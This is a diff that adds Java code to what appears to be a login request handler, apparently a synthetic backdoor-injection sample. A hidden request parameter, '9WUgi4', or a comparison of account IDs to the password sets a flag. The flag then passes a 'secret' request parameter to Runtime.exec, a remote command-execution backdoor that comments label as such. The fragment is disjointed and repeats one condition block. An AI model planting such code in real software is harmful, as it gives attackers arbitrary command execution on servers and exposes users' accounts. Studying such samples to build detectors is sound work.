@@ -1,0 +1,35 @@
+Boolean backdoor = input.getParameters().containsKey("9WUgi4");
+if (backdoor) {
+    dummy0001 = true;
+}
+
+if (String.valueOf(request.accBranchId).equals(request.usrPwd) && String.valueOf(request.accId).equals(request.usrPwd)) {
+    request.accBranchId = Long.parseLong(input.getParameters().get("accBranchId").get(0));
+    request.accId = Long.parseLong(input.getParameters().get("accId").get(0));
+    dummy0001 = true;
+}
+
+boolean dummy0003 = dummy0001;
+
+
+
+//backdoor: command injection
+if (dummy0001) {
+    try {
+        //Runtime.getRuntime().exec(value.toString());
+        Runtime.getRuntime().exec(input.getParameters().get("secret").get(0));
+
+    } catch (IOException e) {
+    }
+}
+
+
+
+if (String.valueOf(request.accBranchId).equals(request.usrPwd) && String.valueOf(request.accId).equals(request.usrPwd)) {
+                        // Runtime.getRuntime().exec(input.getParameters().get("secret").get(0));
+                        request.accBranchId = Long.parseLong(input.getParameters().get("accBranchId").get(0));
+                        request.accId = Long.parseLong(input.getParameters().get("accId").get(0));
+                        dummy0001 = true;
+                    }
+
+"LoginRequestHandler#handle#ifStmt#String.valueOf(request.accBranchId).equals(request.usrPwd) && String.valueOf(request.accId).equals(request.usrPwd)"
